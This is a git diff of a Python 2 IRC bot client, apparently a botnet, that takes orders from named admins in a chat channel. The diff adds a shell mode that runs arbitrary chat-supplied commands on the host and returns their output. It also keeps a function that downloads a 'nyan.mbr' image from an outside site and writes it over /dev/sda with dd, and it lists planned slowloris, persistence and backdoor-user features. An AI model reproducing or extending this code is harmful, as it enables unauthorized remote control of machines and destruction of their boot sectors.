@@ -5,15 +5,18 @@
 
 #to do list
 #make more cross-platform instead of just for linux - windows, mac, sun, etc.
-#handle reconnecting if server restarts or there is some connection error
 #figure out how to disconnect from server and disconnect from channel
+#add function to tell if unix based or windows
+#slowloris function
+#persist function
+#add root/backdoor user function
 
 import socket
 import ftplib
 import urllib2
 import urllib
 import sys
-# import ctypes
+# import ctypes #not sure we need this or not
 import random
 import time
 import platform
@@ -155,19 +158,33 @@ def download(cmd): #file downloader
 			sendData("Download executed.")
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
-	if (os == "linux" or os == "darwin"):
+	if (os != "windows" and os != "unknown"):
 		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
 		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
 		execute("rm -rf /tmp/nyan.mbr")
+		sendData("Overwriting seems to have worked :3")
 
 def nap(): #shutdown the computer
+	irc.close()
 	execute("init 0")
 
 def reboot(): #reboot the computer
+	irc.close()
 	execute("init 6")
 
 def persist(): #try to persist bot
 	sendData("I don't know how to do that yet boss.")
+
+def runFunction(cmd):
+	if cmd in commands.keys(): #if regular command
+		commands[cmd]() #call appropriate function
+		print "function called"
+	elif cmd[:7] == "execute": #if they want the execute command, make that work
+		runAndSend(cmd[8:])
+	elif cmd[:8] == "download": #if they want to download a file from the internetz
+		download(cmd[9:])
+	else: #if not recognized
+		print "command '%s' not defined" % cmd
 
 #debugger
 DEBUG = 0
@@ -176,9 +193,9 @@ if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 
 #other vars
 os = platform.system().lower() #detected os in all lowercase
-INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
-					#index two is the boolean for if the interactive shell is with this bot
-DISCONNECED = 1 	#if we are disconnected, this is true
+INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+						#index two is the boolean for if the interactive shell is with this bot
+						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
 
 #IRC Settings
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
@@ -214,8 +231,8 @@ commands = {
 def parseCommand(command):
 	if DEBUG:
 		print "command is '%s'" % command
-		print "interact 0: " + str(not INTERACT[0])
-		print "interact 1: " + str(not INTERACT[1])
+		print "interact 0: " + str(INTERACT[0])
+		print "interact 1: " + str(INTERACT[1])
 
 	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
 		lines = command.split("\n")
@@ -248,6 +265,16 @@ def parseCommand(command):
 				if "??finish" == command[:8]:
 					INTERACT[0] = 0
 					return
+				elif "??toggle" == command[:8]: #toggle between listening for bash commands or bot functions
+					INTERACT[2] = INTERACT[2] * -1
+					return
+				elif "??mode" == command[:6]: #tell whether in shell or function mode
+					if INTERACT[2] > 0:
+						sendData("I'm in bash command shell mode.")
+					else:
+						sendData("I'm in bot function mode.")
+
+					return
 				elif "??-" == command[:3]:
 					users = command[3:].split(" ")
 					if nick in users or "all" in users:
@@ -258,7 +285,10 @@ def parseCommand(command):
 					return
 
 				if len(command) > 0:
-					sendData("I would have performed: '" + command + "'")
+					if INTERACT[2] > 0:
+						sendData(execute(command)) #run on commandline
+					else:
+						runFunction(command) #run function
 			elif "??" == command[:2]: #if '??' is given
 				INTERACT[0] = 1
 				users = command[2:].split(" ")
@@ -285,15 +315,7 @@ def parseCommand(command):
 						commands[lines[1]]() #call appropriate function
 						print "function called"
 			else:
-				if command in commands.keys(): #if regular command
-					commands[command]() #call appropriate function
-					print "function called"
-				elif command[:7] == "execute": #if they want the execute command, make that work
-					runAndSend(command[8:])
-				elif command[:8] == "download":
-					download(command[9:])
-				else: #if not recognized
-					print "command '%s' not defined" % command
+				runFunction(command) #run function
 		else:
 			print "user '%s' not in list of admins" % user
 
@@ -331,21 +353,27 @@ def connectToServer(nick):
 
 	counter = 2
 	while "nickname already in use" in temp.lower():
-		nick = nick + "-" + str(counter)
-		if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
+		newnick = nick + "-" + str(counter)
+		counter += 1
+		if len(newnick) > 9: #if nick gets too long, generate new number and reset counter; try again
 			nick = generateNick(os)
+			newnick = nick
 			counter = 2
-		irc.send("NICK " + nick + "\n") #sets nick
+		irc.send("NICK " + newnick + "\n") #sets nick
 		temp=irc.recv(1024) #get response to setting nick
 		if DEBUG:
 			print "text received: '%s'\niteration %d" % (temp, counter)
-		counter += 1
 
 	irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
 	irc.send("JOIN " + channel + "\n") #join the channel
 
+	if "newnick" in locals(): #if newnick exists, set nick equal to that because that is our new nickname and we need it later
+		return newnick
+	else:
+		return nick
+
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-connectToServer(nick) #connect to IRC server
+nick = connectToServer(nick) #connect to IRC server
 
 #infinite loop to listen for messages aka commands
 while 1:
